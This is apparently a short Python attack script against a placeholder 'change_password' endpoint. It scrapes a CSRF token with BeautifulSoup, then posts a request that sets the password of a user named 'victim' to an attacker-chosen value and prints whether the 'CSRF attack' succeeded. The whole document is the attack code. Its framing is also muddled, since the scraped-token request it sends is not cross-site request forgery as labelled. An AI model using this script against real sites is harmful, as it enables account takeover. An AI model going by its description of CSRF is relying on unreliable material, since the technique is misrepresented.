
import requests
from bs4 import BeautifulSoup

# Target URL
url = "http://vulnerable-application.com/change_password"

# CSRF token
csrf_token = None

# Fetch the login page to get the CSRF token
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrf_token'}).get('value')

# Attacker-controlled parameters
params = {
    'csrf_token': csrf_token,
    'username': 'victim',
    'password': 'attacker_password'
}

# Send the CSRF attack request
response = requests.post(url, data=params)

# Check if the password was changed
if response.status_code == 200 and 'Password changed' in response.text:
    print('CSRF attack successful')
else:
    print('CSRF attack failed')
